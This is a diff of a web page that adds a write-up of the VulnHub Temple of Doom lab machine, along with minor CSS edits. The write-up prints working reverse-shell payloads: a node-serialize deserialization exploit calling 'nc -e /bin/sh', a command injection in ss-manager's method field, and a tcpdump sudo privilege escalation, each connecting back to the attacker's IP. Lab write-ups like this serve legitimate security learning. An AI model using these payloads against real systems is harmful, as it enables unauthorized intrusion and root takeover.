@@ -22,7 +22,7 @@ font-size: 30px;
 font-style:italic;
 font-weight: bold;
 text-align:center;
-display: block;
+display: block; 
 }
 
                    
@@ -45,20 +45,11 @@ position:absolute;
   border:2px white;
   border-style: solid;
   margin-top: 10px;
-  
 }
      
 
 
 
-.box:hover {
-  background-color: #242323;
-  cursor: pointer;
-  -webkit-transition: background-color 2s ease-out;
-  -moz-transition: background-color 2s ease-out;
-  -o-transition: background-color 2s ease-out;
-  transition: background-color 2s ease-out;
-}
 .type_effect h1 {
   overflow: hidden; /* Ensures the content is not revealed until the animation */
   border-right: .15em solid orange; /* The typwriter cursor */
@@ -85,7 +76,7 @@ position:absolute;
 }
 .article{
   width: 90%;
-  height: 100%;
+  height: 10%;
   box-shadow: 1px 2px 7px 3px white;
   margin-left: 5%;
   margin-top: 110px;
@@ -95,7 +86,7 @@ position:absolute;
 .article-heading{
   font-family: charter, Georgia, Cambria, "Times New Roman", Times, serif;
   color: white;
-  margin-left: 5px;
+  margin-left: 10px;
 }
 .article-content
 {
@@ -162,13 +153,123 @@ Difficulty: Easy/intermediate<br>
 Link: https://www.vulnhub.com/<br>entry/temple-of-doom-1,243/
 ---------------------------------------------------------------<br>
 Usually i am starting by scanning the ip of the machine but The ip was already exist so there was no need to scan upon it<br>
-<img src="https://user-images.githubusercontent.com/42525438/96742032-bc612b80-13c2-11eb-81d7-4475dcdb41b3.png" class="article-images"><br>
+<img src="ip.png" class="article-images"><br>
 So first i stated with scanning the open ports using nmap <br>
-→nmap -sC -sV -p- 192.168.1.109 -oN nmap</p>
+→nmap -sC -sV -p- 192.168.1.109 -oN nmap<br>
+<img src="nmap.png" class="article-images"><br>
+I checked the http website and there was nothing interesting
+<img src="website.png" class="article-images"><br>
+I tried to get the directories using wfuzz but i got nothing<br>
+<br>
+→Wfuzz -c -z file,/usr/share/wordlists/dirbuster-list-2.3-medium.txt — hc 404 http://192.168.1.109:666/FUZZ <br>
+<br>
+Also tried to check if there is any vulnerabilities using nikto but also got nothing <br>
+<br>
+→nikto -h http://192.168.1.109:666<br>
+  
+<img src="nikto.png" class="article-images"><br>
 
-</article>    
+→Nikto -h http://192.168.1.106<br>
+<br>
+So i tried to run burbsuit to chech what is going on on the back ground of the page<br>
+<br>
+I found there is base 64 encerapted cookies value<br>
+<br>
+And when i decoded it i got this<br>
+<img src="cookies decoded.png" class="article-images"><br>
+User and Token and when it expires<br>
+<br>
+First i searched how to log in using an csrftoken but the result wasn’t that good<br>
+<br>
+So i tried to change in the value of the cookies<br>
+First i sent each 2 togother to the server but i got an error each time
+Which was kind of useful cause it gave me the name of the node module name (node-serialize)<br>
+<img src="error-proof.png" class="article-images"><br>
+
+Then i tried each one individually until i got a result when i sent the username alone<br>
+<img src="hello_admin.png" class="article-images"><br>
+
+So i started to google if there is any vulnerabilities published for node-serialize
+
+and i found one
+<img src="google_search.png" class="article-images"><br>
+i customized it a little bit so i can get shell
+and added it to the username parameter<br>
+<br>
+Payload:
+<br>
+{“username”:”_$$ND_FUNC$$_function(){return <br> require(‘child_process’).execSync(‘nc -e /bin/sh 192.168.1.106 1234’,<br>
+	(e,out,err)=>{console.log(out);}); }()”}fim
+<br>
+<br>Then i encoded it and sent it to the server so i got a shell …
+<br>
+<img src="nodeadmin_shell.png" class="article-images"><br>
+<br> Now i am (nodeadmin) user
+
+<br>I tried sudo -l to see if there’s services i can run as sudo but there wasn’t and <br> didn’t find any thing interesting in the home directory<br>
+<br> So in order to enumerate more i changed directory to /tmp and got Linenum.sh using
+
+<br>→git clone https://github.com/rebootuser/LinEnum.git
+<br><img src="linenum_chmod.png" class="article-images"><br>
+
+<br>After i changed LinEnum.sh to executable i ran it and found that the user fireman can run sudo commands
+<br><img src="fireman.png" class="article-images"><br>
+<br> So i ran the same script again and captured only the fireman user using grep to see if there is any service might be running by him and i found one called ss-manager<br>
+
+<br><img src="fireman_service.png" class="article-images"><br>
+<br>
+<br>I checked google for any available vulnerabilities and the first result was the answer<br>
+
+<br><img src="ss-manager searcb.png" class="article-images"><br>
+
+<br>By looking into the proof of concept i found that if i connect on localhost using netcat on the port 8839 it will be able to creat a file called evil in the tmp directory under the name of fireman user
+<br><img src="proof of concept.png" class="article-images"><br>
+<br>So first i checked of this port is open on the machine Using the command : netstat -anu<br>
+
+it was there
+<br><img src="netstat.png" class="article-images"><br>
+
+<br>So i started listening on my machine and customized the payload in order to give me shell instead<br>
+<br>
+Payload:
+<br>
+→nc -u 127.0.0.1 8839
+<br>
+<br>
+→add: {“server_port”:8003, “password”:”test”, “method”:”||nc -nv 192.168.1.106 4444 -e /bin/bash||”}
+<br>
+<br><img src="fireman_access.png" class="article-images"><br>
+<br>
+now i am fireman user<br>
+<br>
+<br>So i tried sudo -l and found three services could be run as sudo
+<br><img src="sudo -l.png" class="article-images"><br>
+
+<br>I checked if i can escalate any of them to get root access and i found that it’s possible with tcpdump<br>
+<br><img src="gtfobins.png" class="article-images"><br>
+
+<br>
+
+So the method will be adding a command in the command variable and it will be run as root in the end
+
+<br>
+<br>
+
+I customized the command to give me root shell instead:
+
+<br>
+<br>
+→COMMAND=’nc -nv 192.168.1.106 8888 -e /bin/bash’
+
+<br>
+
+<br>And i got root access...:)
+<br><img src="root_access.png" class="article-images"><br>
 
 
 
 
+</article>  
     </body>
+
+
